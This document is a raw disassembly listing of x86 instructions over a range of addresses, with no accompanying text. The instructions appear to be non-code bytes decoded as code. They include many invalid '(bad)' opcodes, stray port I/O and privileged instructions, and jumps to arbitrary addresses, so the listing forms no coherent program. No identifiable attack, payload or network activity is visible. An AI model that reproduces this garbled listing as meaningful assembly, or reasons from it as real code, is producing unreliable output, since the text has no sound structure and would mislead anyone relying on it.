  40ea92:	add    BYTE PTR [ebp-0x497cf1d4],dh
  40ea98:	inc    ebx
  40ea99:	pop    esi
  40ea9a:	(bad)  
  40ea9b:	push   ebp
  40ea9c:	add    al,BYTE PTR [ebx]
  40ea9e:	inc    ebx
  40ea9f:	loope  0x40eae9
  40eaa1:	pop    es
  40eaa2:	pmaxub mm3,mm1
  40eaa5:	arpl   WORD PTR [edi-0x14],bx
  40eaa8:	sub    dh,0x85
  40eaab:	mov    eax,ds:0xe103e7e2
  40eab0:	sbb    ebx,0x7f5683d5
  40eab6:	adc    BYTE PTR [esi-0x52],dl
  40eab9:	mov    esp,0xe782c588
  40eabe:	xlat   BYTE PTR ds:[ebx]
  40eabf:	push   edi
  40eac0:	(bad)  
  40eac1:	(bad)  
  40eac2:	and    esp,DWORD PTR [edx-0x27]
  40eac5:	test   BYTE PTR [ebp+0x3e7e285],0x67
  40eacc:	mov    al,0x7
  40eace:	add    al,0x62
  40ead0:	shl    BYTE PTR [esi+0x0],cl
  40ead3:	jne    0x40eaae
  40ead5:	out    0x1c,eax
  40ead7:	adc    eax,0x7188eef9
  40eadc:	loop   0x40eac5
  40eade:	add    ecx,DWORD PTR [ebx+0x745e2b58]
  40eae4:	mov    esi,0x565cefc6
  40eae9:	lahf   
  40eaea:	pop    edi
  40eaeb:	and    BYTE PTR fs:[edi+0x1a],0x68
  40eaf0:	shl    BYTE PTR [esi+ebp*8+0x59],cl
  40eaf4:	add    BYTE PTR [esi],0xc2
  40eaf7:	add    BYTE PTR [edx],bh
  40eaf9:	lock sti 
  40eafb:	pop    ebp
  40eafc:	inc    esp
  40eafd:	mov    esi,0x566cef96
  40eb02:	add    bl,BYTE PTR [ebp+0x34]
  40eb05:	xor    dh,0x95
  40eb08:	pusha  
  40eb09:	aas    
  40eb0a:	in     eax,dx
  40eb0b:	sti    
  40eb0c:	and    eax,0x20192a82
  40eb11:	or     bl,BYTE PTR [ebx]
  40eb13:	or     eax,0x3e59dde
  40eb18:	bound  edx,QWORD PTR [esi-0x41]
  40eb1b:	or     edx,DWORD PTR [ebp+0x5d]
  40eb1e:	add    BYTE PTR [ebx+0x6afd81fc],bl
  40eb24:	xchg   esi,eax
  40eb25:	loop   0x40eb34
  40eb27:	ins    DWORD PTR es:[edi],dx
  40eb28:	cdq    
  40eb29:	in     al,0x0
  40eb2b:	jmp    0xe9412474
  40eb30:	popa   
  40eb31:	rol    BYTE PTR [edi+ecx*2-0x3b027e2c],cl
  40eb38:	loope  0x40eb25
  40eb3a:	add    cl,ch
  40eb3c:	push   esi
  40eb3d:	pop    ebp
  40eb3e:	mov    cl,0xd7
  40eb40:	popa   
  40eb41:	(bad)  
  40eb43:	leave  
  40eb44:	adc    eax,0x6624fd83
  40eb49:	mov    ecx,0x5756e900
  40eb4e:	adc    edx,DWORD PTR [ebp+0x3f]
  40eb51:	cmp    DWORD PTR [ebx],0xffffffe3
  40eb54:	inc    ecx
  40eb55:	fld    DWORD PTR [eax]
  40eb57:	mul    bh
  40eb59:	imul   ebx,DWORD PTR [esi],0xc46100e9
  40eb5f:	sub    eax,0xdd96609
  40eb64:	gs in  eax,0xe3
  40eb67:	add    cl,ch
  40eb69:	dec    esp
  40eb6a:	and    ah,BYTE PTR [ecx]
  40eb6c:	jmp    0x6bc5bdd2
  40eb71:	pop    esp
  40eb72:	cmp    ebp,0xc961cc
  40eb78:	jmp    0x9e7a8637
  40eb7d:	xor    eax,0x9f8681d0
  40eb82:	jg     0x40eb81
  40eb84:	fmulp  st(7),st
  40eb86:	fstp   TBYTE PTR [edx-0x27ed609]
  40eb8c:	sub    cl,BYTE PTR [ebx-0x65]
  40eb8f:	jne    0x40eb95
  40eb91:	outs   dx,DWORD PTR ds:[esi]
  40eb92:	push   ebp
  40eb93:	iret   
  40eb94:	shl    BYTE PTR [esi+0x2300817f],cl
  40eb9a:	aam    0xd
  40eb9c:	test   bl,dl
  40eb9e:	and    edi,edi
  40eba0:	dec    DWORD PTR [eax+0x7f0f1e24]
  40eba6:	pop    ebp
  40eba7:	cli    
  40eba8:	inc    esp
  40ebaa:	fbld   TBYTE PTR [eax+0xddcfb00]
  40ebb0:	test   BYTE PTR [edi],bh
  40ebb2:	and    edi,edi
  40ebb4:	jmp    DWORD PTR [esi-0x44ffeca4]
  40ebba:	repz sbb edi,edi
  40ebbd:	inc    esp
  40ebbe:	sbb    eax,0xab00003d
  40ebc3:	fadd   QWORD PTR [eax]
  40ebc5:	cmovns ebp,DWORD PTR [edi-0x2044ffe2]
  40ebcc:	or     ah,BYTE PTR [eax]
  40ebce:	mov    ebx,0x1f860ddc
  40ebd3:	and    edi,edi
  40ebd5:	jmp    DWORD PTR [esi-0x52]
  40ebd8:	and    BYTE PTR [eax],al
  40ebda:	jnp    0x40eba9
  40ebdc:	test   BYTE PTR [ecx+0x3dff1d20],cl
  40ebe2:	aam    0xbc
  40ebe4:	add    BYTE PTR [eax],al
  40ebe6:	xchg   esp,eax
  40ebe7:	pop    eax
  40ebe8:	jnp    0x40ebe5
  40ebea:	inc    esp
  40ebeb:	sbb    eax,0xdc8b003d
  40ebf0:	add    cl,ch
  40ebf2:	arpl   WORD PTR [esi],bx
  40ebf4:	(bad)  
  40ebf5:	push   DWORD PTR [eax]
  40ebf7:	cmp    eax,0x26b80f69
  40ebfc:	std    
  40ebfd:	inc    DWORD PTR [esp+edx*8-0x4a]
  40ec01:	add    ecx,DWORD PTR [eax]
  40ec03:	pop    ecx
  40ec04:	cmc    
  40ec05:	or     dl,BYTE PTR [edx+ebx*2]
  40ec08:	pop    ebx
  40ec09:	sti    
  40ec0a:	inc    esp
  40ec0b:	and    al,0x83
  40ec0d:	clc    
  40ec0e:	rol    DWORD PTR ss:[esi+0x18562e3],cl
  40ec15:	add    BYTE PTR [edi-0xb],dl
  40ec18:	add    al,0x0
  40ec1a:	bound  eax,QWORD PTR [edi+0x7267d77d]
  40ec20:	add    DWORD PTR ds:0x4d245,edi
  40ec26:	add    BYTE PTR [ebp-0x8],ah
  40ec29:	sbb    ebx,edi
  40ec2b:	in     eax,dx
  40ec2c:	ss pop ss
  40ec2e:	sub    DWORD PTR [edx+0x72],eax
  40ec31:	add    DWORD PTR [edi],ecx
  40ec33:	in     al,0x33
  40ec35:	idiv   edi
  40ec37:	aad    0x58
  40ec39:	sub    ebx,edi
  40ec3b:	int    0x56
  40ec3d:	sbb    eax,0x866f365f
  40ec42:	mov    al,0xbf
  40ec44:	push   es
  40ec45:	pop    edx
  40ec46:	push   cs
  40ec47:	in     al,dx
  40ec48:	jb     0x40ec10
  40ec4a:	sub    BYTE PTR [edx-0x27df575],0x7c
  40ec51:	add    DWORD PTR [eax],eax
  40ec53:	loope  0x40ec7e
  40ec55:	or     BYTE PTR [edi],cl
  40ec57:	fadd   QWORD PTR [ecx-0x2b7201a2]
  40ec5d:	jg     0x40ec5e
  40ec5f:	test   DWORD PTR [ecx+0xa],esi
  40ec62:	test   BYTE PTR [edi-0x35],ah
  40ec65:	pop    ecx
  40ec66:	(bad)  
  40ec67:	xor    esp,esp
  40ec69:	call   edi
  40ec6b:	lea    esi,[esi-0x4bd6bea7]
  40ec71:	or     DWORD PTR [edi+0x185e1],eax
  40ec77:	dec    ebx
  40ec78:	loope  0x40ecd8
  40ec7a:	dec    BYTE PTR [ebp-0x78]
  40ec7d:	(bad)  
  40ec7e:	dec    esp
  40ec7f:	arpl   WORD PTR [edi-0x71],bp
  40ec82:	inc    esp
  40ec83:	pusha  
  40ec84:	mov    cl,0x63
  40ec86:	pop    es
  40ec87:	imul   edi,DWORD PTR [eax-0x1eff36fb],0xdb06acd9
  40ec91:	or     eax,0xedeafc04
  40ec96:	or     edi,eax
  40ec98:	pop    eax
  40ec99:	dec    ebp
  40ec9a:	add    ecx,esp
  40ec9c:	(bad)  
  40ec9d:	(bad)  
  40ec9f:	fdiv   DWORD PTR [ebx+0x52]
  40eca2:	push   ss
  40eca3:	or     cl,ch
  40eca5:	aad    0x61
  40eca7:	xor    BYTE PTR [ebp-0x6e711fff],0x53
  40ecae:	jmp    0x40ecde
  40ecb0:	adc    dh,BYTE PTR [ebx-0x6]
  40ecb3:	sbb    al,0x55
  40ecb5:	adc    DWORD PTR [esp+ecx*1],ebx
  40ecb8:	jmp    0x82104d64
  40ecbd:	mov    ch,0x92
  40ecbf:	or     eax,0x2f0c26d9
  40ecc4:	xchg   ecx,eax
  40ecc5:	sbb    esp,DWORD PTR [ecx-0x51]
  40ecc8:	xor    DWORD PTR [ebp+0x56adc061],0xbd711fab
  40ecd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecd3:	or     ah,al
  40ecd5:	jp     0x40ecbe
  40ecd7:	add    esp,DWORD PTR [edx-0x43]
  40ecda:	mov    ds:0xb4bd21d1,al
  40ecdf:	or     bl,ch
  40ece1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ece2:	out    0x3,eax
  40ece4:	(bad)  
  40ece5:	into   
  40ece6:	jge    0x40ecb0
  40ece8:	(bad)  
  40ece9:	retf   0x8327
  40ecec:	jmp    0x109c7a5
  40ecf1:	push   esp
  40ecf2:	gs daa 
  40ecf4:	inc    esp
  40ecf5:	inc    edx
  40ecf6:	shl    DWORD PTR [eax-0x41],1
  40ecf9:	and    ebp,0xdba691de
  40ecff:	repnz dec ebx
  40ed01:	push   esp
  40ed02:	inc    edi
  40ed03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed04:	push   es
  40ed05:	and    edi,DWORD PTR [ecx+0x0]
  40ed08:	loope  0x40ecf0
  40ed0a:	sbb    DWORD PTR ds:0x434758d9,esp
  40ed10:	in     eax,dx
  40ed11:	pop    eax
  40ed12:	adc    eax,0x19eef925
  40ed17:	and    eax,0x45156af9
  40ed1c:	add    eax,0xecc35a6a
  40ed21:	jbe    0x40ecd8
  40ed23:	or     eax,0x31ba2277
  40ed28:	sub    al,0xdd
  40ed2a:	adc    eax,0xd9816abb
  40ed2f:	xchg   DWORD PTR ds:0x5f0de542,esi
  40ed35:	out    dx,al
  40ed36:	daa    
  40ed37:	push   esi
  40ed38:	sub    DWORD PTR [esi-0x32],ebx
  40ed3b:	mov    esi,0x41270c69
  40ed40:	jmp    0x254e2b89
  40ed45:	mov    ds:0xa2603cb9,al
  40ed4a:	mov    ecx,0xb99a6010
  40ed4f:	sub    BYTE PTR [eax-0x46],dh
  40ed52:	mov    ecx,0x5400641c
  40ed57:	iret   
  40ed58:	test   BYTE PTR [ecx-0x3],al
  40ed5b:	jle    0x40ed5a
  40ed5d:	sbb    ah,BYTE PTR [esi]
  40ed5f:	mov    esi,0xb965ad87
  40ed64:	cmp    DWORD PTR [ecx],esi
  40ed66:	call   0x29:0x427dfdca
  40ed6d:	jmp    0xcd8d3fd3
  40ed72:	ins    DWORD PTR es:[edi],dx
  40ed73:	es push ebx
  40ed75:	jb     0x40ed0e
  40ed77:	je     0x40ed69
  40ed79:	add    eax,0x29837bbb
  40ed7e:	pop    ebx
  40ed7f:	push   ebp
  40ed80:	outs   dx,BYTE PTR ds:[esi]
  40ed81:	add    BYTE PTR [eax],ch
  40ed83:	fld    DWORD PTR [eax]
  40ed85:	mov    edx,edi
  40ed87:	fsub   QWORD PTR [ebx+ecx*4]
  40ed8a:	pop    es
  40ed8b:	frstor [eax]
  40ed8d:	mov    ecx,edi
  40ed8f:	fsubr  QWORD PTR [eax]
  40ed91:	add    esp,DWORD PTR [ecx]
  40ed93:	cdq    
  40ed94:	mov    BYTE PTR [edi+eiz*2-0x4b],al
  40ed98:	cmp    ecx,eax
  40ed9a:	lods   eax,DWORD PTR ds:[esi]
  40ed9b:	adc    al,0x8b
  40ed9d:	inc    esp
  40ed9e:	test   DWORD PTR [bp+si],edi
  40eda1:	enter  0xfd0c,0x9b
  40eda5:	in     eax,dx
  40eda6:	mov    esp,0x677c8321
  40edab:	mov    ebp,edi
  40edad:	push   cs
  40edae:	xchg   DWORD PTR [edx+0xf],ebx
  40edb1:	add    bl,bh
  40edb3:	dec    ebp
  40edb4:	and    DWORD PTR [edi+ebx*4],0xd8
  40edbb:	mov    esi,eax
  40edbd:	inc    eax
  40edbe:	adc    bh,BYTE PTR [ebx-0x684b0228]
  40edc4:	dec    eax
  40edc5:	add    BYTE PTR [eax],al
  40edc7:	retf   
  40edc8:	dec    ecx
  40edc9:	dec    edi
  40edca:	mov    ebx,eax
  40edcc:	lock pushf 
  40edce:	in     al,dx
  40edcf:	cmp    al,0x21
  40edd1:	test   eax,eax
  40edd3:	lods   al,BYTE PTR ds:[esi]
  40edd4:	cld    
  40edd5:	sbb    dl,BYTE PTR [ebx]
  40edd7:	mov    ebx,eax
  40edd9:	add    DWORD PTR [edi+eiz*2-0x47],ebx
  40eddd:	out    0x65,eax
  40eddf:	dec    esi
  40ede0:	and    edi,edi
  40ede2:	lea    esi,[esi+0x6ac581d7]
  40ede8:	push   eax
  40ede9:	inc    ecx
  40edea:	and    al,0x93
  40edec:	dec    esi
  40eded:	dec    esp
  40edee:	add    BYTE PTR [ecx],al
  40edf0:	pop    ss
  40edf1:	mov    DWORD PTR [edi+edx*4-0x7c],ebp
  40edf5:	cmp    DWORD PTR [esi+0x4c],eax
  40edf8:	push   esi
  40edf9:	add    BYTE PTR [eax],0x62
  40edfc:	jb     0x40edff
  40edfe:	cmp    al,0x99
  40ee00:	fs mov edi,0xdcfb973b
  40ee06:	push   cs
  40ee07:	hlt    
  40ee08:	fs add al,0x33
  40ee0b:	and    dh,dl
  40ee0d:	pop    edx
  40ee0e:	dec    esp
  40ee0f:	pop    ebp
  40ee10:	(bad)  
  40ee11:	mov    BYTE PTR [eax],0x55
  40ee14:	inc    BYTE PTR [eax+eax*8+0x3]
  40ee18:	mov    al,BYTE PTR [ecx+eiz*8+0x6a]
  40ee1c:	stc    
  40ee1d:	shl    BYTE PTR [ebx],0x0
  40ee20:	inc    esi
  40ee21:	fwait
  40ee22:	mov    eax,DWORD PTR [eax+eiz*2-0x79]
  40ee26:	dec    ecx
  40ee27:	push   cs
  40ee28:	mov    ah,0xb4
  40ee2a:	add    BYTE PTR [ebx],cl
  40ee2c:	adc    cl,BYTE PTR [edx]
  40ee2e:	push   esi
  40ee2f:	(bad)  
  40ee30:	in     eax,dx
  40ee31:	stos   BYTE PTR es:[edi],al
  40ee32:	add    eax,0xb1091244
  40ee37:	and    ecx,DWORD PTR [edx-0x6efbc011]
  40ee3d:	inc    eax
  40ee3e:	mov    ecx,DWORD PTR [ebx-0x7a]
  40ee41:	or     BYTE PTR [ebx+ebp*2-0x15408982],0x24
  40ee49:	imul   ecx,DWORD PTR [ebx-0x789f8e40],0x47
  40ee50:	call   0xdc0b1004
  40ee55:	inc    ebp
  40ee56:	sbb    eax,0x8c5c6d24
  40ee5b:	push   ecx
  40ee5c:	sub    eax,0xcc0f0132
  40ee61:	icebp  
  40ee62:	mov    edx,0xc0722256
  40ee67:	mov    BYTE PTR [esi],cl
  40ee69:	(bad)  
  40ee6a:	clc    
  40ee6b:	mov    BYTE PTR [esi],ah
  40ee6d:	into   
  40ee6e:	hlt    
  40ee6f:	mov    BYTE PTR [esi],ah
  40ee71:	(bad)  
  40ee72:	sub    al,0x85
  40ee74:	mov    ds:0x15fb9cd8,al
  40ee79:	jnp    0x40ee99
  40ee7b:	push   edi
  40ee7c:	aam    0x50
  40ee7e:	stos   DWORD PTR es:[edi],eax
  40ee7f:	pop    ds
  40ee80:	jp     0x40eef0
  40ee82:	fcom   QWORD PTR [edx]
  40ee84:	add    BYTE PTR [eax],dh
  40ee86:	sbb    BYTE PTR [ecx-0x50],dh
  40ee89:	xor    DWORD PTR [ecx+0x25ea4a72],0x25daf3cc
  40ee93:	les    esp,FWORD PTR [ebx]
  40ee95:	imul   ecx,DWORD PTR [edi+0x1a591c63],0x4e1074c
  40ee9f:	cli    
  40eea0:	add    esp,DWORD PTR [edx-0x36]
  40eea3:	xchg   ebp,eax
  40eea4:	repnz push eax
  40eea6:	cdq    
  40eea7:	jb     0x40eef2
  40eea9:	loopne 0x40ef23
  40eeab:	out    0xc3,al
  40eead:	adc    BYTE PTR [edx+0x62],bh
  40eeb0:	mov    DWORD PTR [ecx-0x1f],0x166069a8
  40eeb7:	ins    BYTE PTR es:[edi],dx
  40eeb8:	jmp    FWORD PTR [ebx-0x36]
  40eebb:	arpl   ax,ax
  40eebd:	js     0x40ee98
  40eebf:	out    0x8a,eax
  40eec1:	and    DWORD PTR [ebp-0x4ae67539],esi
  40eec7:	xlat   BYTE PTR ds:[ebx]
  40eec8:	ret    
  40eec9:	jmp    0xf598:0x7923c415
  40eed0:	dec    ebx
  40eed1:	fcom   DWORD PTR ds:0x91692bc4
  40eed7:	idiv   BYTE PTR [edi+0xf]
  40eeda:	ins    DWORD PTR es:[edi],dx
  40eedb:	pop    esi
  40eedc:	push   esi
  40eedd:	loopne 0x40eedc
  40eedf:	or     esp,DWORD PTR [eax]
  40eee1:	(bad)  
  40eee2:	retf   0x9363
  40eee5:	jae    0x40eec0
  40eee7:	out    0x8a,eax
  40eee9:	add    cl,ah
  40eeeb:	mov    ch,0x9b
  40eeed:	add    al,0x62
  40eeef:	fld    DWORD PTR [eax]
  40eef1:	test   eax,0xe912eefe
  40eef6:	popa   
  40eef7:	dec    esi
  40eef8:	inc    ebp
  40eef9:	xchg   ebp,eax
  40eefa:	jo     0x40eea3
  40eefc:	sub    DWORD PTR [edx],ebp
  40eefe:	and    edi,DWORD PTR [edi+0x13e5e6c2]
  40ef04:	adc    ch,cl
  40ef06:	popa   
  40ef07:	dec    edi
  40ef08:	add    DWORD PTR [edx-0x11ffeba7],ebp
  40ef0e:	loop   0x40ee95
  40ef10:	sbb    ch,cl
  40ef12:	popa   
  40ef13:	jo     0x40ef82
  40ef15:	clc    
  40ef16:	(bad)  
  40ef17:	jnp    0x40eea2
  40ef19:	cs or  al,bh
  40ef1c:	rcl    BYTE PTR [edx],cl
  40ef1e:	mov    ds:0x67ab3a18,eax
  40ef23:	dec    ebp
  40ef24:	and    edi,edx
  40ef26:	popa   
  40ef27:	(bad)  ds:0x554e637f
  40ef2d:	stc    
  40ef2e:	pop    esi
  40ef2f:	inc    ebx
  40ef30:	dec    ebx
  40ef31:	call   0x2a51c511
  40ef36:	inc    esi
  40ef37:	aad    0xf
  40ef39:	neg    BYTE PTR [edx+edx*4+0x1a]
  40ef3d:	jmp    0x3143dea3
  40ef42:	arpl   WORD PTR [ecx-0x19],si
  40ef45:	push   eax
  40ef46:	xor    BYTE PTR [ebx-0x3],bh
  40ef49:	imul   bh
  40ef4b:	and    al,0x0
  40ef4d:	out    dx,al
  40ef4e:	add    bh,ah
  40ef50:	adc    al,0x3
  40ef52:	test   al,0x40
  40ef54:	ror    BYTE PTR [ecx],cl
  40ef56:	cdq    
  40ef57:	fisttp DWORD PTR [edi+0x6e632c81]
  40ef5d:	outs   dx,BYTE PTR ds:[esi]
  40ef5e:	sbb    bl,BYTE PTR [esi]
  40ef60:	mov    edx,0xb16dad87
  40ef65:	or     eax,0xdd8b597
  40ef6a:	add    ch,bh
  40ef6c:	cmp    edi,edi
  40ef6e:	shr    BYTE PTR [ecx],0xcd
  40ef71:	or     eax,edx
  40ef73:	push   0x5f7c7e15
  40ef78:	call   0xded67aa3
  40ef7d:	xchg   esp,eax
  40ef7e:	rcl    dl,0x99
  40ef81:	and    DWORD PTR [eax+eiz*2],esp
  40ef84:	enter  0xc032,0xfb
  40ef88:	popa   
  40ef89:	retf   
  40ef8a:	mov    edx,0x7fff0e64
  40ef8f:	mov    dl,0x99
  40ef91:	and    DWORD PTR [eax],ebp
  40ef93:	inc    BYTE PTR [ecx]
  40ef95:	aaa    
  40ef96:	xor    edi,DWORD PTR [ebx-0x63]
  40ef99:	mov    cl,al
  40ef9b:	xor    BYTE PTR [eax],al
  40ef9d:	xor    eax,eax
  40ef9f:	dec    ebx
  40efa0:	(bad)  
  40efa1:	retf   
  40efa2:	mov    ecx,ebx
  40efa4:	add    ecx,ebp
  40efa6:	lea    edi,[ecx]
  40efa8:	cld    
  40efa9:	xor    dl,dl
  40efab:	dec    ecx
  40efac:	(bad)  
  40efad:	lds    esp,FWORD PTR [ebx]
  40efaf:	mov    cl,0xdd
  40efb1:	mov    esi,0x45db0090
  40efb6:	cmp    eax,0x21a08200
  40efbb:	and    al,0xd4
  40efbd:	dec    esi
  40efbe:	test   DWORD PTR [eax+0x44fd9d8c],ebx
  40efc4:	ds stos BYTE PTR es:[edi],al
  40efc6:	mov    ch,0xff
  40efc8:	aam    0xd
  40efca:	jg     0x40efdb
  40efcc:	(bad)  
  40efcd:	lods   eax,DWORD PTR ds:[esi]
  40efce:	push   cs
  40efcf:	mov    dh,0x7e
  40efd1:	fld    QWORD PTR [ebx-0xa]
  40efd4:	aas    
  40efd5:	fcom   DWORD PTR [eax+0x1]
  40efd8:	mov    ebx,0xdf88ffdc
  40efdd:	fcom   DWORD PTR [eax]
  40efdf:	mov    edi,eax
  40efe1:	fcomp  DWORD PTR [eax]
  40efe3:	mov    DWORD PTR [edx+0x46],esp
  40efe6:	sbb    eax,0x1d36db20
  40efeb:	sbb    al,0x6d
  40efed:	push   es
  40efee:	sbb    al,BYTE PTR [ecx]
  40eff0:	bound  eax,QWORD PTR [edx-0x6cda978]
  40eff6:	lods   eax,DWORD PTR ds:[esi]
  40eff7:	and    ecx,DWORD PTR [esi-0x69]
  40effa:	mov    eax,DWORD PTR [ebx]
  40effc:	jb     0x40efe9
  40effe:	lods   eax,DWORD PTR ds:[esi]
  40efff:	and    esi,DWORD PTR [edx-0x17]
  40f002:	mov    ebp,0x41938223
  40f007:	aas    
  40f008:	fstp   TBYTE PTR ds:0xaa792c1d
  40f00e:	aad    0x32
  40f010:	jns    0x40f069
  40f012:	in     eax,0xe
  40f014:	loope  0x40ef9b
  40f016:	repnz inc DWORD PTR [eax]
  40f019:	and    eax,0xe9028b97
  40f01e:	std    
  40f01f:	sub    BYTE PTR [ecx+eiz*4],dl
  40f022:	xchg   DWORD PTR [edi-0x6f04b5fd],edx
  40f028:	and    edx,DWORD PTR [esi+0x3b000181]
  40f02e:	(bad)  
  40f02f:	sub    BYTE PTR [eax],ah
  40f031:	gs std 
  40f033:	aaa    
  40f034:	sbb    BYTE PTR [edx-0x7e],ah
  40f037:	jle    0x40f07c
  40f039:	ds jbe 0x40effd
  40f03c:	mov    BYTE PTR [esi],ah
  40f03e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f03f:	sbb    eax,0x3fd7a33b
  40f044:	cmp    bl,BYTE PTR [eax-0x46fa7a82]
  40f04a:	push   cx
  40f04c:	cmp    BYTE PTR [esi],0xa6
  40f04f:	and    eax,0xecfd6500
  40f054:	adc    DWORD PTR [edx-0x7e],esp
  40f057:	jle    0x40f01b
  40f059:	fstp   TBYTE PTR [ebp-0x26a6dbd8]
  40f05f:	xor    DWORD PTR [ebx],eax
  40f061:	out    0x32,eax
  40f063:	out    0x3,eax
  40f065:	bound  esi,QWORD PTR [esi+esi*4+0x5b5c54df]
  40f06c:	add    al,0x62
  40f06e:	fdecstp 
  40f070:	cdq    
  40f071:	pusha  
  40f072:	fs xchg esi,eax
  40f074:	adc    ebx,DWORD PTR [ebp+0x2f]
  40f077:	jmp    0x40f06c
  40f079:	fmul   DWORD PTR [esp+eax*1]
  40f07c:	hlt    
  40f07d:	add    BYTE PTR [edx-0x30dc33e3],bl
  40f083:	fild   QWORD PTR [edx-0x6c5c773c]
  40f089:	xor    al,bl
  40f08b:	gs ret 
  40f08d:	ret    
  40f08e:	(bad)  
  40f08f:	(bad)  
  40f091:	jle    0x40f034
  40f093:	mov    ebp,0xbda986c3
  40f098:	mov    edi,0x325c5503
  40f09d:	pop    esi
  40f09e:	sbb    al,0x77
  40f0a0:	and    ch,BYTE PTR [esp+eiz*2]
  40f0a3:	pop    ebx
  40f0a4:	inc    ebp
  40f0a5:	in     eax,dx
  40f0a6:	or     eax,0x41876277
  40f0ab:	adc    eax,0x196203e9
  40f0b0:	jno    0x40f079
  40f0b2:	inc    ecx
  40f0b3:	lods   eax,DWORD PTR ds:[esi]
  40f0b4:	pop    ss
  40f0b5:	mov    edx,0xb00b2dec
  40f0ba:	(bad)  
  40f0bb:	(bad)  
  40f0bd:	jle    0x40f075
  40f0bf:	jbe    0x40f11c
  40f0c1:	daa    
  40f0c2:	ss fsub st,st(7)
  40f0c5:	add    esi,DWORD PTR ds:0x26275b76
  40f0cb:	fsub   st,st(7)
  40f0cd:	add    edi,DWORD PTR [ebp+0x62afcb2d]
  40f0d3:	(bad)  
  40f0d5:	mov    ah,0xd8
  40f0d7:	mov    ds:0x83618100,al
  40f0dc:	std    
  40f0dd:	outs   dx,BYTE PTR ds:[esi]
  40f0de:	fcomp  QWORD PTR [ebp-0x40]
  40f0e1:	test   BYTE PTR [eax],0xea
  40f0e4:	loopne 0x40f0f4
  40f0e6:	jmp    0xdcd534c
  40f0eb:	sahf   
  40f0ec:	fld    DWORD PTR [eax]
  40f0ee:	jmp    0xfd660aef
  40f0f3:	fs adc eax,0x35950525
  40f0f9:	out    0xdb,eax
  40f0fb:	jbe    0x40f173
  40f0fd:	std    
  40f0fe:	push   0x30
  40f100:	repnz add BYTE PTR [edx-0x2b],dh
  40f104:	mov    edx,0xd961e840
  40f109:	je     0x40f16c
  40f10b:	push   esp
  40f10c:	nop
  40f10d:	jbe    0x40f174
  40f10f:	push   esp
  40f110:	cdq    
  40f111:	inc    eax
  40f112:	jo     0x40f13c
  40f114:	adc    bh,BYTE PTR [eax]
  40f116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f117:	sbb    eax,0x907c8ee7
  40f11c:	ja     0x40f11b
  40f11e:	add    ah,bh
  40f120:	ins    DWORD PTR es:[edi],dx
  40f121:	std    
  40f122:	out    0x97,al
  40f124:	bound  esp,QWORD PTR [ecx+ebp*1]
  40f127:	popa   
  40f128:	fld    DWORD PTR [eax]
  40f12a:	shl    BYTE PTR [esi],0x77
  40f12d:	std    
  40f12e:	into   
  40f12f:	push   edi
  40f130:	cdq    
  40f131:	inc    eax
  40f132:	jo     0x40f15e
  40f134:	mov    edx,0xf22e022c
  40f139:	and    al,0xf2
  40f13b:	mov    dl,0x1
  40f13d:	push   cs
  40f13e:	push   0xffffff93
  40f140:	out    0x0,eax
  40f142:	jmp    0x2a4220a9
  40f147:	add    BYTE PTR [ecx+0x1d],bl
  40f14a:	and    eax,0xbd5c62c9
  40f14f:	icebp  
  40f150:	popa   
  40f151:	(bad)  [ecx+0x2cc18700]
  40f157:	inc    eax
  40f158:	xor    ah,BYTE PTR [ecx+0x1af02c21]
  40f15e:	jl     0x40f13c
  40f160:	shl    BYTE PTR [ebx+0x123b840e],1
  40f166:	(bad)  
  40f167:	(bad)  
  40f168:	clc    
  40f169:	mov    BYTE PTR [ecx],ah
  40f16b:	and    al,0x7b
  40f16d:	fadd   DWORD PTR [ebx+0xd97a7d]
  40f173:	mov    ecx,DWORD PTR [eax-0xe]
  40f176:	inc    ecx
  40f177:	and    al,0x8b
  40f179:	in     al,0xca
  40f17b:	paddd  mm6,QWORD PTR [edi]
  40f17e:	std    
  40f17f:	dec    DWORD PTR [ebx-0x1a]
  40f182:	pop    ebp
  40f183:	ins    BYTE PTR es:[edi],dx
  40f184:	dec    esp
  40f185:	pop    esi
  40f186:	add    BYTE PTR [eax],0x3b
  40f189:	(bad)  ds:0x44e038b6
  40f18f:	and    al,0x2b
  40f191:	mov    WORD PTR [ebx],es
  40f193:	inc    ebx
  40f194:	or     ah,dh
  40f196:	retf   0x537c
  40f199:	test   BYTE PTR [ecx+0xd7fb24],0x0
  40f1a0:	and    BYTE PTR [ecx-0x5b77efdf],0x21
  40f1a7:	sub    bl,bh
  40f1a9:	fld    DWORD PTR [ebx+0xa2200b0]
  40f1af:	(bad)  
  40f1b0:	cmp    esi,DWORD PTR [ebx+0x35b82d9]
  40f1b6:	fld    DWORD PTR [eax]
  40f1b8:	mov    eax,DWORD PTR [edi-0x4fea344]
  40f1be:	fadd   DWORD PTR [eax-0x77]
  40f1c1:	xchg   ecx,eax
  40f1c3:	xor    al,0x50
  40f1c5:	xchg   ebp,eax
  40f1c6:	or     dh,BYTE PTR [edx+0xd88f24]
  40f1cc:	add    BYTE PTR [edx-0x9],ah
  40f1cf:	ss (bad) 
  40f1d1:	neg    BYTE PTR [esi-0x7d9dff53]
  40f1d7:	mov    eax,0xad9ef6fe
  40f1dc:	add    BYTE PTR [edx-0x7e],ah
  40f1df:	push   eax
  40f1e0:	mov    bl,0x46
  40f1e2:	out    0x1,al
  40f1e4:	add    BYTE PTR [edx+0x31],ah
  40f1e7:	jl     0x40f1b3
  40f1e9:	jp     0x40f1f8
  40f1eb:	pop    edx
  40f1ec:	inc    BYTE PTR [ebp+0x6dbf8637]
  40f1f2:	std    
  40f1f3:	push   eax
  40f1f4:	or     esp,DWORD PTR [edx-0x7e]
  40f1f7:	jl     0x40f184
  40f1f9:	inc    esi
  40f1fa:	inc    edx
  40f1fb:	add    al,BYTE PTR [eax]
  40f1fd:	(bad)  
  40f1fe:	test   ebp,0xad679623
  40f204:	and    esi,DWORD PTR [edx+0x4f]
  40f207:	mov    gs,eax
  40f209:	fiadd  DWORD PTR gs:[eax+eax*1]
  40f20d:	loope  0x40f259
  40f20f:	int    0xff
  40f211:	add    al,ch
  40f213:	adc    eax,0x82634026
  40f218:	add    DWORD PTR [edx+ebx*8-0x6a],esi
  40f21c:	sub    dh,BYTE PTR [ebp-0x22]
  40f21f:	cs inc ecx
  40f221:	aas    
  40f222:	jmp    0x40f25e
  40f224:	lods   eax,DWORD PTR ds:[esi]
